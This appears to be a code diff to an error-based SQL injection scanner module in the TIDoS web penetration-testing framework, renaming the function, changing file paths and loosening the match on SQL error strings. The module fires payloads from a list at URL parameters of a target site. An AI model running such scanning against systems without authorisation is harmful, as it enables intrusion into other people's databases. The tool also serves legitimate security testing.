@@ -5,6 +5,7 @@
 #    TIDoS Framework     #
 #-:-:-:-:-:-:-:-:-:-:-:-:#
 
+#Author: @_tID
 #This script is a part of TIDoS Framework
 #https://github.com/theInfectedDrake/TIDoS-Framework 
 
@@ -45,7 +46,7 @@ ctr=0
 path_list = []
 payloads = []
 
-def sqlisearch0x00(web):
+def errorsqlsearch(web):
 
 	os.system('clear')
 	print R+'\n    ======================================'
@@ -54,7 +55,7 @@ def sqlisearch0x00(web):
 	print R+'  [It is recommended to run ScanEnum/Crawlers  '
 	print R+'          before using this module] \n'
 	
-	with open('files/sql_payloads.lst','r') as pay:
+	with open('files/payload-db/errorsql_payloads.lst','r') as pay:
 	    for payload in pay:
 		rem = payload
 		rem = rem.replace('\n','')
@@ -64,7 +65,7 @@ def sqlisearch0x00(web):
 	web0 = web.replace('https://','')
 	web0 = web.replace('http://','')
 	try:
-	        with open('tmp/'+web0+'-links.lst','r') as ro:
+	        with open('tmp/logs/'+web0+'-logs/'+web0+'-links.lst','r') as ro:
 		    for r in ro:
 			r = r.replace('\n','')
 			path_list.append(r)
@@ -75,25 +76,22 @@ def sqlisearch0x00(web):
 	
 	    global ctr
 	    ctr = 0
+	    print B+' [*] Testing '+C+bugs
 	    if '?' in str(bugs) and '=' in str(bugs):
 		for p in payloads:
 		    bugs = bugs + str(p)
 	    	    print B+" [*] Trying : "+C+ bugs
 		    time.sleep(0.7)
 	    	    response = requests.get(bugs).text
-	    	    if (('error' in response) and ('syntax' in response) and ('SQL' in response)):
+	    	    if (('error' in response) and ('syntax' in response) or ('SQL'.lower() in response.lower())):
 			print '\n'+G+' [+] Vulnerable link detected : ' + web
-			print ''+R+' [*] Injecting payloads...'
-			print ''+B+' [!] PoC : ' + str(bugs)
-	    	        print ''+R+" [!] Payload : " + O + p + '\033[0m'
+			print R+' [*] Injecting payloads...'
+			print B+' [!] PoC : ' + str(bugs)
+	    	        print R+" [!] Payload : " + O + p + '\033[0m'
 	    	        print "\033[1m [!] Code Snippet : \n\033[0m" + response + '\n'
 			ctr = ctr + 1
 	    else:
 		print ''+GR+' [-] Link without parameter : '+B+'' + str(bugs)
-	    if ctr > 0:
-	        print '\n'+G+' [!] Congratulations! You have successfully found %s SQL bugs \033[0m\n' % ctr
-	    else:
-		print '\n'+R+' [-] No SQLi vulnerability found'
 
 	for urli in path_list:
 	    sqli_func(urli)
